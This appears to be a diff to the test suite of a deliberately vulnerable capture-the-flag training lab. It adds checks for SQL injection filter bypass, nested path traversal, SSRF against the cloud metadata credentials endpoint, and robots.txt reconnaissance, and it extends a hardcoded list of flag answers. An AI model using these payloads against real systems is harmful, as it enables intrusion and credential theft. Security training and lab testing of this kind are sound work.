@@ -38,6 +38,12 @@ def run_all_tests():
     assert res.json().get("exists") is True
     print("[+] SQLi Blind Inference: OK")
 
+    print("[*] Testing SQLi Nested Filter Bypass...")
+    res = client.get("/labs/sqli?nested_q=UNUNIONION+SELSELECTECT")
+    assert res.status_code == 200
+    assert "FLAG{nested_keyword_filter_bypass_3310}" in res.text
+    print("[+] SQLi Nested Filter Bypass: OK")
+
     print("[*] Testing XSS Reflected...")
     res = client.get("/labs/xss?q=<script>alert(1)</script>")
     assert res.status_code == 200
@@ -72,6 +78,12 @@ def run_all_tests():
     assert "FLAG{p4th_tr4v3rs4l_lfi_r34d_syst3m_f1l3s_1048}" in res.text
     print("[+] Local File Inclusion: OK")
 
+    print("[*] Testing LFI Nested Sanitization Bypass...")
+    res = client.get("/labs/lfi?nested_file=....//....//flag.txt")
+    assert res.status_code == 200
+    assert "FLAG{nested_traversal_non_recursive_bypass_5591}" in res.text
+    print("[+] LFI Nested Traversal Bypass: OK")
+
     print("[*] Testing JWT Attack (Signature bypass & role elevation)...")
     forged_token = jwt.encode({"sub": "attacker", "role": "admin"}, "wrong_or_none_key", algorithm="HS256")
     res = client.post("/labs/jwt/admin-vault", data={"token": forged_token})
@@ -84,6 +96,12 @@ def run_all_tests():
     assert res.status_code == 200
     assert "FLAG{ssrf_internal_pivot_pwned_9941}" in res.text
     print("[+] SSRF Internal Pivot Exfiltration: OK")
+
+    print("[*] Testing SSRF Cloud Metadata Exfiltration...")
+    res = client.post("/labs/ssrf/check-metadata", data={"meta_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ProductionAppRole"})
+    assert res.status_code == 200
+    assert "FLAG{ssrf_cloud_metadata_credential_leak_6631}" in res.text
+    print("[+] SSRF Metadata Exfiltration: OK")
 
     print("[*] Testing SSTI Jinja2...")
     res = client.post("/labs/ssti/render", data={"name": "{{ SYSTEM_FLAG }}", "title": "Hacker"})
@@ -191,19 +209,40 @@ def run_all_tests():
     assert "FLAG{dom_xss_execution_sink_untrusted_source_9918}" in res.text
     print("[+] DOM XSS: OK")
 
-    print("[*] Verifying Flag Submission Engine for all 24 flags...")
+    print("[*] Testing Reconnaissance & Hidden Robots...")
+    res_robots = client.get("/robots.txt")
+    assert res_robots.status_code == 200
+    assert "restricted-archive" in res_robots.text
+
+    res_recon = client.get("/labs/recon?view=secret-archive")
+    assert res_recon.status_code == 200
+    assert "FLAG{recon_hidden_robots_path_disclosure_1982}" in res_recon.text
+
+    res_archive = client.get("/restricted-archive/")
+    assert res_archive.status_code == 200
+    assert "FLAG{recon_hidden_robots_path_disclosure_1982}" in res_archive.text
+
+    res_probe = client.post("/labs/recon/probe", data={"path": "/restricted-archive/"})
+    assert res_probe.status_code == 200
+    assert "FLAG{recon_hidden_robots_path_disclosure_1982}" in res_probe.text
+    print("[+] Reconnaissance Discovery & Flag Disclosure: OK")
+
+    print("[*] Verifying Flag Submission Engine for all 28 flags...")
     all_flags = [
         "FLAG{sqli_auth_bypass_login_pwned_8192}",
         "FLAG{sqli_union_db_extraction_7719}",
         "FLAG{blind_sqli_boolean_extraction_9102}",
+        "FLAG{nested_keyword_filter_bypass_3310}",
         "FLAG{r3fl3ct3d_xss_c00k13_st0l3n_4421}",
         "FLAG{st0r3d_xss_p3rs1st3nt_p4yl04d_5532}",
         "FLAG{xss_stole_admin_cookie}",
         "FLAG{1d0r_privilege_escalation_view_secret_3301}",
         "FLAG{c0mm4nd_1nj3ct10n_r00t_sh3ll_9824}",
         "FLAG{p4th_tr4v3rs4l_lfi_r34d_syst3m_f1l3s_1048}",
+        "FLAG{nested_traversal_non_recursive_bypass_5591}",
         "FLAG{jwt_broken_verification_admin_3389}",
         "FLAG{ssrf_internal_pivot_pwned_9941}",
+        "FLAG{ssrf_cloud_metadata_credential_leak_6631}",
         "FLAG{ssti_jinja2_template_rce_8812}",
         "FLAG{race_condition_toctou_balance_glitch_4011}",
         "FLAG{xxe_external_entity_disclosure_7261}",
@@ -217,6 +256,7 @@ def run_all_tests():
         "FLAG{weak_prng_predictable_token_7734}",
         "FLAG{bola_api_sensitive_field_exposure_5519}",
         "FLAG{dom_xss_execution_sink_untrusted_source_9918}",
+        "FLAG{recon_hidden_robots_path_disclosure_1982}",
     ]
 
     for f in all_flags:
